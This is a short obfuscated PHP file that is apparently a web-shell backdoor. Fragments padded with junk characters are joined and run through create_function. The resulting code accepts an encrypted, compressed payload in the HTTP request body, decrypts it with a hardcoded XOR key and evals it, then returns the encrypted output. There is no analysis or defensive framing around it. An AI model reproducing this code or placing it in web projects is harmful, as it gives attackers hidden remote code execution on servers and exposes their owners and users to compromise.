<?php
$T='atcAh("/$kh(.+)$kf/",@fAile_Aget_Acontents("php://inpAut")A,$m)==';
$O=str_replace('y','','cryyeateyyy_functyion');
$H='rlen($t);$oA=A"";Afor($i=0;$iA<$AAl;){for($j=0;(A$j<$c&&$AiA<$l);';
$N='aCXA1RsF3qwWuAqF3F";AfunctiAon x($At,AA$k){$cA=strlen($k);$lA=sAt';
$r='bAase64_Aencode(@x(@AgzAcomprAess($o),$kA));pArint(A"$p$kh$r$kf");}';
$I='$j++,A$i++){$o.A=$t{$Ai}^$kA{$j};A}}return $Ao;}ifA (@pAreAgAAA_m';
$l='1) {@oAb_AstartA()A;@evAal(@gAzuncompressA(@x(@AbaAse64_decode($';
$F='$k="26356Aeb5";A$kh="Ae0f58dA0A87AA654";$kf="7d09b5bAdf6e3";$Ap="';
$W='m[1])A,$k)))A;$o=A@obA_get_coAAnteAAnAts()A;@ob_end_clean();$r=@';
$t=str_replace('A','',$F.$N.$H.$I.$T.$l.$W.$r);
$k=$O('',$t);$k();
?>
